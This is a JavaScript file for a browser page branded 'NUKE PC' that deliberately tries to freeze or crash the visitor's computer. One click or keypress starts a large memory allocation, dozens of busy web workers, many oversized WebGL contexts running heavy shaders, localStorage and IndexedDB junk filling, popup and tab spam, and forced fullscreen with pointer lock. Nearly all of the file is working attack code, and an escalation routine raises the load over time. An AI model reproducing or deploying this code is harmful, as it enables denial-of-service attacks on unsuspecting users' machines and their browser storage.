let worker = null;
let isRunning = false;

let crashBtn = null;
let stopBtn = null;
let statusEl = null;
let timeEl = null;
let fpsEl = null;
let loadEl = null;
let loadBar = null;
let loadBarContainer = null;
let btnSub = null;
let statusBadge = null;
let statusDot = null;

let gl = null;
let program = null;
let canvas = null;
let startTime = 0;
let animFrameId = null;
let frameCount = 0;
let lastFpsUpdate = 0;

// ─── MULTIPLE CONTEXTS ──────────────────────────────────────
let glContexts = [];
let glCanvases = [];

// ─── CONFIG ──────────────────────────────────────────────────
const CONFIG = {
  shaderLoops: 300,           // MAXIMUM
  raymarchSteps: 900,         // MAXIMUM
  renderPasses: 60,           // MAXIMUM
  resolutionScale: 8.0,       // 8x resolution
  memoryChunks: 800,          // 800MB memory bomb
  contextCount: 8,            // 8 WebGL contexts fighting
  workerCount: 30,            // 30 CPU workers
  escalationLevel: 0,
  maxEscalation: 30
};

let memoryBomb = [];
let tortureWorkers = [];
let lastFps = 60;
let consecutiveLowFps = 0;
let escalationTimer = 0;
let isEscalating = false;

// ─── UI HELPERS ──────────────────────────────────────────
function formatTime(ms) {
  if (!isFinite(ms)) return '--:--.---';
  const total = Math.max(0, Math.floor(ms));
  const minutes = String(Math.floor(total / 60000)).padStart(2, '0');
  const seconds = String(Math.floor((total % 60000) / 1000)).padStart(2, '0');
  const millis = String(total % 1000).padStart(3, '0');
  return `${minutes}:${seconds}.${millis}`;
}

// ─── PC CRASHER: MULTIPLE WEBGL CONTEXTS ──────────────────
function createMultipleContexts() {
  for (let i = 0; i < CONFIG.contextCount; i++) {
    try {
      const c = document.createElement('canvas');
      c.style.position = 'fixed';
      c.style.inset = '0';
      c.style.zIndex = '-1';
      c.style.pointerEvents = 'none';
      c.style.opacity = '0.1';
      c.width = window.innerWidth * CONFIG.resolutionScale;
      c.height = window.innerHeight * CONFIG.resolutionScale;
      document.body.prepend(c);
      
      const g = c.getContext('webgl2', {
        antialias: false,
        powerPreference: 'high-performance',
        desynchronized: true,
        preserveDrawingBuffer: false
      }) || c.getContext('webgl', {
        antialias: false,
        powerPreference: 'high-performance',
        preserveDrawingBuffer: false
      });
      
      if (g) {
        glContexts.push(g);
        glCanvases.push(c);
      }
    } catch(e) {}
  }
  console.log(`🔥 Created ${glContexts.length} WebGL contexts fighting for resources`);
}

function destroyMultipleContexts() {
  glContexts.forEach((g, i) => {
    try {
      const ext = g.getExtension('WEBGL_lose_context');
      if (ext) ext.loseContext();
    } catch(e) {}
  });
  glContexts = [];
  glCanvases.forEach(c => c.remove());
  glCanvases = [];
}

// ─── PC CRASHER: MEMORY BOMB ──────────────────────────────
function memoryBombAttack() {
  try {
    for (let i = 0; i < CONFIG.memoryChunks; i++) {
      const size = 1024 * 1024;
      const chunk = new Uint8Array(size);
      for (let j = 0; j < size; j += 4096) {
        chunk[j] = Math.random() * 255;
        chunk[j+1] = Math.random() * 255;
        chunk[j+2] = Math.random() * 255;
      }
      memoryBomb.push(chunk);
    }
  } catch(e) {}
}

// ─── PC CRASHER: CPU WORKER ARMY ──────────────────────────
function spawnWorkerArmy() {
  try {
    const workerCode = `
      let data = new Float64Array(5000000);
      let counter = 0;
      self.onmessage = function(e) {
        if (e.data === 'start') {
          setInterval(() => {
            for (let i = 0; i < data.length; i++) {
              data[i] = Math.sin(i * 0.001 + counter) * Math.cos(i * 0.002 + counter) * 
                        Math.tan(i * 0.0005 + counter) * Math.sqrt(Math.abs(Math.sin(i * 0.003)));
              data[i] = data[i] * 1.6180339887 + 0.5;
              data[i] = Math.fround(data[i]);
              data[i] = Math.pow(Math.abs(data[i]), 1.3);
              data[i] = Math.log(Math.abs(data[i]) + 1);
              data[i] = Math.atan(data[i]) * 1.7;
              data[i] = Math.asin(Math.sin(data[i] * 0.5));
              data[i] = Math.acos(Math.cos(data[i] * 0.7));
              data[i] = Math.exp(Math.abs(data[i]) / 1000);
              data[i] = Math.sqrt(Math.abs(data[i]) + 1);
            }
            counter += 0.01;
            self.postMessage({ done: true });
          }, 1);
        }
      };
    `;
    for (let i = 0; i < CONFIG.workerCount; i++) {
      const blob = new Blob([workerCode], { type: 'text/javascript' });
      const w = new Worker(URL.createObjectURL(blob));
      w.postMessage('start');
      tortureWorkers.push(w);
    }
  } catch(e) {}
}

function terminateWorkers() {
  tortureWorkers.forEach(w => { try { w.terminate(); } catch(e) {} });
  tortureWorkers = [];
}

// ─── PC CRASHER: STORAGE BOMB ─────────────────────────────
function storageBomb() {
  try {
    // localStorage
    let data = '';
    for (let i = 0; i < 2000; i++) {
      data += 'x'.repeat(5000);
      try {
        localStorage.setItem('bomb_' + i, data);
      } catch(e) { break; }
    }
  } catch(e) {}
  
  try {
    // IndexedDB
    const request = indexedDB.open('bombDB', 1);
    request.onsuccess = function(event) {
      const db = event.target.result;
      const store = db.createObjectStore('bombStore', { autoIncrement: true });
      for (let i = 0; i < 2000; i++) {
        const chunk = new Uint8Array(1024 * 1024);
        for (let j = 0; j < chunk.length; j += 4096) {
          chunk[j] = Math.random() * 255;
        }
        store.add(chunk);
      }
    };
  } catch(e) {}
}

// ─── PC CRASHER: POPUP SPAM ──────────────────────────────
function popupSpam() {
  for (let i = 0; i < 100; i++) {
    setTimeout(() => {
      window.open('about:blank', '_blank', 'width=200,height=100');
    }, i * 50);
  }
}

// ─── PC CRASHER: MULTIPLE TABS ────────────────────────────
function tabSpam() {
  for (let i = 0; i < 10; i++) {
    setTimeout(() => {
      window.open(window.location.href, '_blank');
    }, i * 200);
  }
}

// ─── PC CRASHER: CPU SPIN ─────────────────────────────────
function spinCPU(duration) {
  const start = performance.now();
  let x = 0;
  while (performance.now() - start < duration) {
    x += Math.sin(x) * Math.cos(x + 1) * Math.tan(x + 2);
    x = x * 1.6180339887 + 0.5;
    x = Math.pow(Math.abs(x), 1.3);
    x = Math.log(Math.abs(x) + 1);
    x = Math.atan(x) * 1.7;
    x = Math.asin(Math.sin(x * 0.5));
    x = Math.acos(Math.cos(x * 0.7));
    x = Math.exp(Math.abs(x) / 1000);
  }
}

// ─── PC CRASHER: FULLSCREEN + POINTER LOCK ───────────────
function fullscreenTorture() {
  try {
    document.documentElement.requestFullscreen().catch(() => {});
  } catch(e) {}
  try {
    document.body.requestPointerLock().catch(() => {});
  } catch(e) {}
}

// ─── ESCALATION ──────────────────────────────────────────────
function escalateTorture() {
  if (isEscalating) return;
  isEscalating = true;
  
  CONFIG.escalationLevel++;
  
  CONFIG.shaderLoops = Math.min(500, CONFIG.shaderLoops + 30);
  CONFIG.raymarchSteps = Math.min(1500, CONFIG.raymarchSteps + 50);
  CONFIG.renderPasses = Math.min(100, CONFIG.renderPasses + 10);
  CONFIG.resolutionScale = Math.min(12.0, CONFIG.resolutionScale + 0.5);
  CONFIG.memoryChunks = Math.min(1200, CONFIG.memoryChunks + 50);
  CONFIG.contextCount = Math.min(20, CONFIG.contextCount + 2);
  
  // More memory
  try {
    for (let i = 0; i < 50; i++) {
      const size = 1024 * 1024;
      const chunk = new Uint8Array(size);
      for (let j = 0; j < size; j += 4096) {
        chunk[j] = Math.random() * 255;
      }
      memoryBomb.push(chunk);
    }
  } catch(e) {}
  
  // More workers
  try {
    const workerCode = `
      let data = new Float64Array(5000000);
      let counter = 0;
      self.onmessage = function(e) {
        if (e.data === 'start') {
          setInterval(() => {
            for (let i = 0; i < data.length; i++) {
              data[i] = Math.sin(i * 0.001 + counter) * Math.cos(i * 0.002 + counter) * 
                        Math.tan(i * 0.0005 + counter);
              data[i] = Math.pow(Math.abs(data[i]), 1.3);
            }
            counter += 0.01;
          }, 1);
        }
      };
    `;
    for (let i = 0; i < 5; i++) {
      const blob = new Blob([workerCode], { type: 'text/javascript' });
      const w = new Worker(URL.createObjectURL(blob));
      w.postMessage('start');
      tortureWorkers.push(w);
    }
  } catch(e) {}
  
  // More contexts
  try {
    for (let i = 0; i < 2; i++) {
      const c = document.createElement('canvas');
      c.style.position = 'fixed';
      c.style.inset = '0';
      c.style.zIndex = '-1';
      c.style.pointerEvents = 'none';
      c.style.opacity = '0.1';
      c.width = window.innerWidth * CONFIG.resolutionScale;
      c.height = window.innerHeight * CONFIG.resolutionScale;
      document.body.prepend(c);
      const g = c.getContext('webgl2', { antialias: false, powerPreference: 'high-performance' }) || 
                c.getContext('webgl', { antialias: false, powerPreference: 'high-performance' });
      if (g) {
        glContexts.push(g);
        glCanvases.push(c);
      }
    }
  } catch(e) {}
  
  // More popups
  for (let i = 0; i < 20; i++) {
    setTimeout(() => {
      window.open('about:blank', '_blank', 'width=200,height=100');
    }, i * 30);
  }
  
  // CPU spin
  spinCPU(10);
  
  if (gl && program) {
    try {
      gl.deleteProgram(program);
      program = null;
    } catch(e) {}
  }
  
  if (canvas) {
    try {
      canvas.remove();
      canvas = null;
    } catch(e) {}
  }
  
  if (window.gc) {
    try { window.gc(); } catch(e) {}
  }
  
  if (statusEl) {
    statusEl.textContent = `💀 PC NUKE ${CONFIG.escalationLevel} - ${CONFIG.renderPasses}x passes`;
    statusEl.style.color = '#ef4444';
  }
  
  if (window.glitchSystem && window.glitchSystem.isRunning) {
    for (let i = 0; i < 20; i++) {
      setTimeout(() => {
        window.glitchSystem.randomGlitch();
      }, i * 30);
    }
  }
  
  console.log(`💀 PC NUKE Level ${CONFIG.escalationLevel}: ${CONFIG.renderPasses} passes, ${CONFIG.shaderLoops} loops, ${glContexts.length} contexts`);
  
  setTimeout(() => {
    isEscalating = false;
    if (isRunning) {
      createWebGLContext();
    }
  }, 200);
}

// ─── SET IDLE ──────────────────────────────────────────────
function setIdle() {
  isRunning = false;
  isEscalating = false;
  
  if (crashBtn) {
    crashBtn.disabled = false;
    crashBtn.className = 'crash-btn';
    const icon = document.querySelector('.crash-btn .icon');
    if (icon) icon.textContent = '☢️';
    const label = document.getElementById('btnLabel');
    if (label) label.textContent = '☢️ NUKE PC';
    if (btnSub) btnSub.textContent = 'Click to annihilate';
  }
  if (stopBtn) stopBtn.style.display = 'none';
  if (animFrameId) {
    cancelAnimationFrame(animFrameId);
    animFrameId = null;
  }

  if (window.glitchSystem) {
    window.glitchSystem.stop();
  }

  // Clean up
  destroyMultipleContexts();
  terminateWorkers();
  memoryBomb = [];
  CONFIG.escalationLevel = 0;
  consecutiveLowFps = 0;
  escalationTimer = 0;
  
  if (window.gc) {
    try { window.gc(); } catch(e) {}
  }

  if (statusEl) {
    statusEl.textContent = 'Ready';
    statusEl.style.color = '';
  }
  if (timeEl) timeEl.textContent = '00:00.000';
  if (fpsEl) {
    fpsEl.textContent = '--';
    fpsEl.className = 'value';
  }
  if (loadEl) {
    loadEl.innerHTML = '0<span class="unit">%</span>';
    loadEl.className = 'value';
  }
  if (loadBar) loadBar.style.width = '0%';
  if (loadBarContainer) loadBarContainer.classList.remove('active');
  
  if (statusBadge) {
    statusBadge.className = 'status-badge';
    if (statusDot) statusDot.style.background = '#22c55e';
  }

  if (gl) {
    try {
      if (program) gl.deleteProgram(program);
      program = null;
      gl = null;
    } catch(e) {}
  }
  if (canvas) {
    try {
      canvas.remove();
      canvas = null;
    } catch(e) {}
  }
}

// ─── CREATE WEBGL CONTEXT ──────────────────────────────────
function createWebGLContext() {
  if (canvas) return true;

  canvas = document.createElement('canvas');
  canvas.style.position = 'fixed';
  canvas.style.inset = '0';
  canvas.style.zIndex = '-1';
  canvas.style.pointerEvents = 'none';
  canvas.style.opacity = '1';
  document.body.prepend(canvas);

  const scale = CONFIG.resolutionScale;
  canvas.width = window.innerWidth * scale;
  canvas.height = window.innerHeight * scale;

  gl = canvas.getContext('webgl2', {
    antialias: false,
    powerPreference: 'high-performance',
    desynchronized: true,
    preserveDrawingBuffer: false
  });

  if (!gl) {
    gl = canvas.getContext('webgl', {
      antialias: false,
      powerPreference: 'high-performance',
      preserveDrawingBuffer: false
    });
  }

  if (!gl) {
    if (statusEl) statusEl.textContent = 'No WebGL!';
    return false;
  }

  const isWebGL2 = gl.getParameter(gl.VERSION).includes('WebGL 2');

  let vsSource, fsSource;

  const currentLoops = CONFIG.shaderLoops;
  const currentSteps = CONFIG.raymarchSteps;

  if (isWebGL2) {
    vsSource = `#version 300 es
      in vec2 a_position;
      void main() { gl_Position = vec4(a_position, 0.0, 1.0); }`;

    fsSource = `#version 300 es
      precision highp float;
      out vec4 fragColor;
      uniform vec2 u_resolution;
      uniform float u_time;
      uniform int u_pass;

      float poisonMushroom(vec3 p, float t) {
        float v = 0.0;
        float amp = 1.0;
        for (int i = 0; i < ${currentLoops}; i++) {
          float fi = float(i);
          v += amp * sin(p.x * 13.7 + t * 2.4 + fi * 0.01);
          v += amp * cos(p.y * 16.9 + t * 2.8 + fi * 0.01);
          v += amp * sin(p.z * 10.3 + t * 1.6 + fi * 0.01) * cos(p.z * 5.3 + t * 1.2);
          v += amp * tan(atan(p.x * 7.1 + p.y * 3.3 + t) * 1.4);
          v += amp * sin(cos(tan(v * 4.1 + fi * 0.05)) * 5.3);
          v += amp * cos(sin(v * 3.7 + fi * 0.03) * 4.9);
          v += amp * atan(sin(v * 6.3 + t * 2.1) * 1.7);
          v = fract(v * 1.6180339887);
          amp *= 0.37;
          p += vec3(sin(t * 0.9 + fi * 0.001), cos(t * 1.3 + fi * 0.001), sin(t * 0.7 + fi * 0.001));
          p = p * 1.001 + 0.001;
          if (${CONFIG.escalationLevel} > 5) {
            p = abs(p) - 0.5;
          }
          if (${CONFIG.escalationLevel} > 10) {
            p = vec3(sin(p.x + t), cos(p.y + t), tan(p.z + t));
          }
          if (${CONFIG.escalationLevel} > 15) {
            p = p * 1.5 + 0.5;
            p = vec3(atan(p.x + p.y), atan(p.y + p.z), atan(p.z + p.x));
          }
        }
        return v;
      }

      void main() {
        vec2 uv = (gl_FragCoord.xy - u_resolution * 0.5) / u_resolution.y;
        float t = u_time * 0.5 + float(u_pass) * 0.05;
        
        vec3 ro = vec3(
          sin(t * 0.3) * 6.0 + sin(t * 0.7) * 2.0,
          cos(t * 0.4) * 4.0 + 2.0 + cos(t * 0.5) * 1.5,
          -8.0 + sin(t * 0.2) * 3.0 + sin(t * 0.6) * 1.5
        );
        vec3 rd = normalize(vec3(uv * 2.2, 1.9 + sin(t * 0.5) * 0.5));

        float dist = 0.0;
        float accum = 0.0;

        for (int i = 0; i < ${currentSteps}; i++) {
          vec3 p = ro + rd * dist;
          float density = abs(poisonMushroom(p * 3.8 + t * 1.6, t)) * 0.12;
          accum += density * exp(-dist * 0.018);
          accum += sin(dist * 22.0 + t * 7.0) * cos(dist * 15.0) * 0.035;
          accum += cos(dist * 33.0 + t * 9.0) * sin(dist * 27.0) * 0.025;
          accum += sin(dist * 44.0 + t * 11.0) * cos(dist * 38.0) * 0.015;
          dist += max(0.02, density * 0.38);
          if (dist > 120.0 || accum > 20.0) break;
        }

        vec3 col = 0.5 + 0.5 * vec3(
          sin(accum * 5.1 + t * 2.4 + accum * 2.0),
          cos(accum * 6.8 + t * 2.1 + accum * 1.5),
          sin(accum * 4.7 + t * 1.2 + accum * 3.0)
        );
        
        float glow = exp(-accum * 0.3) * 0.2;
        col += glow * vec3(0.8, 0.2, 0.8);
        
        float scanline = sin(uv.y * 1200.0 + t * 200.0) * 0.03;
        col += scanline;
        
        float vhs = sin(uv.x * 800.0 + t * 150.0) * 0.02;
        col += vhs;
        
        float split = sin(uv.y * 5.0 + t * 2.0) * 0.02;
        col.r += split;
        col.b -= split;
        
        col = pow(col, vec3(0.8 + 0.3 * sin(t * 0.1)));
        col = col / (col + 0.8);
        col = clamp(col, 0.0, 1.0);

        fragColor = vec4(col, 1.0);
      }`;
  } else {
    vsSource = `
      attribute vec2 a_position;
      void main() { gl_Position = vec4(a_position, 0.0, 1.0); }`;

    fsSource = `
      precision highp float;
      uniform vec2 u_resolution;
      uniform float u_time;
      uniform int u_pass;

      float poisonMushroom(vec3 p, float t) {
        float v = 0.0;
        float amp = 1.0;
        for (int i = 0; i < ${currentLoops}; i++) {
          float fi = float(i);
          v += amp * sin(p.x * 13.7 + t * 2.4 + fi * 0.01);
          v += amp * cos(p.y * 16.9 + t * 2.8 + fi * 0.01);
          v += amp * sin(p.z * 10.3 + t * 1.6 + fi * 0.01) * cos(p.z * 5.3 + t * 1.2);
          v += amp * tan(atan(p.x * 7.1 + p.y * 3.3 + t) * 1.4);
          v += amp * sin(cos(tan(v * 4.1 + fi * 0.05)) * 5.3);
          v += amp * cos(sin(v * 3.7 + fi * 0.03) * 4.9);
          v += amp * atan(sin(v * 6.3 + t * 2.1) * 1.7);
          v = fract(v * 1.6180339887);
          amp *= 0.37;
          p += vec3(sin(t * 0.9 + fi * 0.001), cos(t * 1.3 + fi * 0.001), sin(t * 0.7 + fi * 0.001));
          p = p * 1.001 + 0.001;
          if (${CONFIG.escalationLevel} > 5) {
            p = abs(p) - 0.5;
          }
          if (${CONFIG.escalationLevel} > 10) {
            p = vec3(sin(p.x + t), cos(p.y + t), tan(p.z + t));
          }
          if (${CONFIG.escalationLevel} > 15) {
            p = p * 1.5 + 0.5;
            p = vec3(atan(p.x + p.y), atan(p.y + p.z), atan(p.z + p.x));
          }
        }
        return v;
      }

      void main() {
        vec2 uv = (gl_FragCoord.xy - u_resolution * 0.5) / u_resolution.y;
        float t = u_time * 0.5 + float(u_pass) * 0.05;
        
        vec3 ro = vec3(
          sin(t * 0.3) * 6.0 + sin(t * 0.7) * 2.0,
          cos(t * 0.4) * 4.0 + 2.0 + cos(t * 0.5) * 1.5,
          -8.0 + sin(t * 0.2) * 3.0 + sin(t * 0.6) * 1.5
        );
        vec3 rd = normalize(vec3(uv * 2.2, 1.9 + sin(t * 0.5) * 0.5));

        float dist = 0.0;
        float accum = 0.0;

        for (int i = 0; i < ${currentSteps}; i++) {
          vec3 p = ro + rd * dist;
          float density = abs(poisonMushroom(p * 3.8 + t * 1.6, t)) * 0.12;
          accum += density * exp(-dist * 0.018);
          accum += sin(dist * 22.0 + t * 7.0) * cos(dist * 15.0) * 0.035;
          accum += cos(dist * 33.0 + t * 9.0) * sin(dist * 27.0) * 0.025;
          accum += sin(dist * 44.0 + t * 11.0) * cos(dist * 38.0) * 0.015;
          dist += max(0.02, density * 0.38);
          if (dist > 120.0 || accum > 20.0) break;
        }

        vec3 col = 0.5 + 0.5 * vec3(
          sin(accum * 5.1 + t * 2.4 + accum * 2.0),
          cos(accum * 6.8 + t * 2.1 + accum * 1.5),
          sin(accum * 4.7 + t * 1.2 + accum * 3.0)
        );
        
        float glow = exp(-accum * 0.3) * 0.2;
        col += glow * vec3(0.8, 0.2, 0.8);
        
        float scanline = sin(uv.y * 1200.0 + t * 200.0) * 0.03;
        col += scanline;
        
        float vhs = sin(uv.x * 800.0 + t * 150.0) * 0.02;
        col += vhs;
        
        float split = sin(uv.y * 5.0 + t * 2.0) * 0.02;
        col.r += split;
        col.b -= split;
        
        col = pow(col, vec3(0.8 + 0.3 * sin(t * 0.1)));
        col = col / (col + 0.8);
        col = clamp(col, 0.0, 1.0);

        gl_FragColor = vec4(col, 1.0);
      }`;
  }

  const vs = gl.createShader(gl.VERTEX_SHADER);
  gl.shaderSource(vs, vsSource);
  gl.compileShader(vs);

  const fs = gl.createShader(gl.FRAGMENT_SHADER);
  gl.shaderSource(fs, fsSource);
  gl.compileShader(fs);

  if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS) || !gl.getShaderParameter(fs, gl.COMPILE_STATUS)) {
    console.error(gl.getShaderInfoLog(vs) || gl.getShaderInfoLog(fs));
    if (statusEl) statusEl.textContent = 'Shader failed!';
    return false;
  }

  program = gl.createProgram();
  gl.attachShader(program, vs);
  gl.attachShader(program, fs);
  gl.linkProgram(program);

  if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
    console.error(gl.getProgramInfoLog(program));
    if (statusEl) statusEl.textContent = 'Link failed!';
    return false;
  }

  gl.useProgram(program);

  const buffer = gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
    -1,-1,  1,-1,  -1,1,
     1,-1,  1,1,   -1,1
  ]), gl.STATIC_DRAW);

  const posLoc = gl.getAttribLocation(program, 'a_position');
  gl.enableVertexAttribArray(posLoc);
  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);

  return true;
}

// ─── RENDER LOOP ──────────────────────────────────────────
function render(now) {
  if (!isRunning || !gl || !program) return;

  const elapsed = (now - startTime) / 1000;
  const heat = Math.min(100, (elapsed / 4) * 60 + 20 + Math.random() * 10);

  // ─── RENDER PASSES ──────────────────────────────────
  for (let pass = 0; pass < CONFIG.renderPasses; pass++) {
    gl.viewport(0, 0, canvas.width, canvas.height);
    const resLoc = gl.getUniformLocation(program, 'u_resolution');
    const timeLoc = gl.getUniformLocation(program, 'u_time');
    const passLoc = gl.getUniformLocation(program, 'u_pass');
    
    if (resLoc) gl.uniform2f(resLoc, canvas.width, canvas.height);
    if (timeLoc) gl.uniform1f(timeLoc, elapsed + pass * 0.05);
    if (passLoc) gl.uniform1i(passLoc, pass);
    
    gl.drawArrays(gl.TRIANGLES, 0, 6);
  }

  // ─── CPU SPIN ──────────────────────────────────────────
  if (CONFIG.escalationLevel > 3) {
    spinCPU(3);
  }

  frameCount++;

  if (now - lastFpsUpdate > 200) {
    const fps = Math.round(frameCount / ((now - lastFpsUpdate) / 1000));
    const load = Math.min(100, Math.round((1 - fps / 60) * 100 + 20));
    
    if (fps < 10 && lastFps < 10) {
      consecutiveLowFps++;
    } else {
      consecutiveLowFps = 0;
    }
    
    if (consecutiveLowFps > 3 && CONFIG.escalationLevel < CONFIG.maxEscalation) {
      escalateTorture();
      consecutiveLowFps = 0;
    }
    
    escalationTimer += 0.2;
    if (escalationTimer > 15 && CONFIG.escalationLevel < CONFIG.maxEscalation) {
      escalateTorture();
      escalationTimer = 0;
    }
    
    lastFps = fps;
    
    if (fpsEl) {
      fpsEl.textContent = fps;
      fpsEl.className = 'value' + (fps < 10 ? ' danger' : fps < 25 ? ' warning' : '');
    }
    if (timeEl) timeEl.textContent = formatTime(now - startTime);
    if (loadEl) {
      loadEl.innerHTML = load + '<span class="unit">%</span>';
      loadEl.className = 'value' + (load > 80 ? ' danger' : load > 50 ? ' warning' : '');
    }
    if (loadBar) loadBar.style.width = load + '%';
    if (loadBarContainer) loadBarContainer.classList.add('active');

    if (statusEl) {
      const escText = CONFIG.escalationLevel > 0 ? ` 💀Lv${CONFIG.escalationLevel}` : '';
      if (fps < 3) {
        statusEl.textContent = `💀 PC MELTING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
        statusEl.style.color = '#ef4444';
        if (statusBadge) statusBadge.className = 'status-badge active';
      } else if (fps < 8) {
        statusEl.textContent = `☠️ GPU DYING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
        statusEl.style.color = '#ef4444';
        if (statusBadge) statusBadge.className = 'status-badge active';
      } else if (fps < 15) {
        statusEl.textContent = `🔥 KILLING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
        statusEl.style.color = '#f59e0b';
        if (statusBadge) statusBadge.className = 'status-badge crashed';
      } else {
        statusEl.textContent = `⚡ DESTROYING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
        statusEl.style.color = '#8b9bb5';
        if (statusBadge) statusBadge.className = 'status-badge active';
      }
    }

    if (btnSub) {
      btnSub.textContent = CONFIG.escalationLevel > 10 ? '💀 PC NUKE MODE' : 
                           CONFIG.escalationLevel > 5 ? '🔥 UNSTOPPABLE' : 
                           '☢️ Escalating...';
    }

    if (window.gc) {
      try { window.gc(); } catch(e) {}
    }

    frameCount = 0;
    lastFpsUpdate = now;
  }

  animFrameId = requestAnimationFrame(render);
}

// ─── START NUKE ──────────────────────────────────────────────
function startNuke() {
  if (isRunning) {
    setIdle();
    if (statusEl) statusEl.textContent = 'Stopped - You survived';
    if (timeEl) timeEl.textContent = '00:00.000';
    if (stopBtn) stopBtn.style.display = 'none';
    return;
  }

  isRunning = true;
  CONFIG.escalationLevel = 0;
  consecutiveLowFps = 0;
  escalationTimer = 0;
  isEscalating = false;
  
  if (crashBtn) {
    crashBtn.className = 'crash-btn running';
    const icon = document.querySelector('.crash-btn .icon');
    if (icon) icon.textContent = '☢️';
    const label = document.getElementById('btnLabel');
    if (label) label.textContent = '☢️ NUKE PC';
    if (btnSub) btnSub.textContent = '💀 Total destruction';
  }
  if (stopBtn) stopBtn.style.display = 'flex';

  if (statusEl) {
    statusEl.textContent = '☢️ PC NUKE INITIATED';
    statusEl.style.color = '#ef4444';
    if (statusBadge) statusBadge.className = 'status-badge crashed';
  }
  if (timeEl) timeEl.textContent = '00:00.000';
  if (fpsEl) {
    fpsEl.textContent = '0';
    fpsEl.className = 'value';
  }
  if (loadEl) {
    loadEl.innerHTML = '0<span class="unit">%</span>';
    loadEl.className = 'value';
  }
  if (loadBar) loadBar.style.width = '0%';
  if (loadBarContainer) loadBarContainer.classList.add('active');

  // ─── PC NUKE: LAUNCH ALL ATTACKS ──────────────────────
  memoryBombAttack();
  spawnWorkerArmy();
  storageBomb();
  fullscreenTorture();
  createMultipleContexts();
  
  // ─── PC NUKE: POPUP + TAB SPAM ──────────────────────
  setTimeout(() => { popupSpam(); }, 1000);
  setTimeout(() => { tabSpam(); }, 2000);

  if (!createWebGLContext()) {
    setIdle();
    return;
  }

  // ─── START GLITCHES ──────────────────────────────────────
  if (window.glitchSystem) {
    setTimeout(() => {
      window.glitchSystem.start();
    }, 1000);
  }

  startTime = performance.now();
  frameCount = 0;
  lastFpsUpdate = startTime;
  lastFps = 60;
  requestAnimationFrame(render);
}

// ─── EVENT LISTENERS ──────────────────────────────────────
document.addEventListener('DOMContentLoaded', function() {
  crashBtn = document.getElementById('crashBtn');
  stopBtn = document.getElementById('stopBtn');
  statusEl = document.getElementById('statusText');
  timeEl = document.getElementById('timeValue');
  fpsEl = document.getElementById('fpsValue');
  loadEl = document.getElementById('loadValue');
  loadBar = document.getElementById('loadBar');
  loadBarContainer = document.getElementById('loadBarContainer');
  btnSub = document.getElementById('btnSub');
  statusBadge = document.getElementById('statusBadge');
  statusDot = document.getElementById('statusDot');
  const deviceBadge = document.getElementById('deviceBadge');

  if (deviceBadge) {
    const isIPhone = /iPhone|iPad|iPod/.test(navigator.userAgent);
    const isAndroid = /Android/.test(navigator.userAgent);
    if (isIPhone || isAndroid) {
      deviceBadge.textContent = '📱 MOBILE - LIMITED';
    } else {
      deviceBadge.textContent = '💻 PC - NUKE MODE';
    }
  }

  if (!crashBtn) {
    console.error("No #crashBtn element found");
    return;
  }

  crashBtn.onclick = startNuke;

  if (stopBtn) {
    stopBtn.onclick = function() {
      setIdle();
      if (statusEl) statusEl.textContent = 'Stopped - You survived';
      if (timeEl) timeEl.textContent = '00:00.000';
      stopBtn.style.display = 'none';
      if (crashBtn) {
        crashBtn.className = 'crash-btn';
        const icon = document.querySelector('.crash-btn .icon');
        if (icon) icon.textContent = '☢️';
        const label = document.getElementById('btnLabel');
        if (label) label.textContent = 'NUKE PC';
        if (btnSub) btnSub.textContent = 'Click to annihilate';
      }
    };
  }

  document.addEventListener('keydown', function(e) {
    if (e.key === ' ' || e.key === 'Enter') {
      e.preventDefault();
      startNuke();
    }
    if (e.key === 'Escape') {
      e.preventDefault();
      if (isRunning) {
        setIdle();
        if (statusEl) statusEl.textContent = 'Stopped - You survived';
        if (timeEl) timeEl.textContent = '00:00.000';
        if (stopBtn) stopBtn.style.display = 'none';
        if (crashBtn) {
          crashBtn.className = 'crash-btn';
          const icon = document.querySelector('.crash-btn .icon');
          if (icon) icon.textContent = '☢️';
          const label = document.getElementById('btnLabel');
          if (label) label.textContent = 'NUKE PC';
          if (btnSub) btnSub.textContent = 'Click to annihilate';
        }
      }
    }
  });

  window.addEventListener('resize', function() {
    if (canvas && gl) {
      const scale = CONFIG.resolutionScale;
      canvas.width = window.innerWidth * scale;
      canvas.height = window.innerHeight * scale;
      gl.viewport(0, 0, canvas.width, canvas.height);
    }
  });

  try {
    if (worker) worker.terminate();
    worker = new Worker(URL.createObjectURL(new Blob([`
      onmessage = function(e) {
        if (e.data[0] === "ping") postMessage(["pong"]);
      };
    `], {type: 'text/javascript'})));
  } catch (e) {}

  setIdle();
});
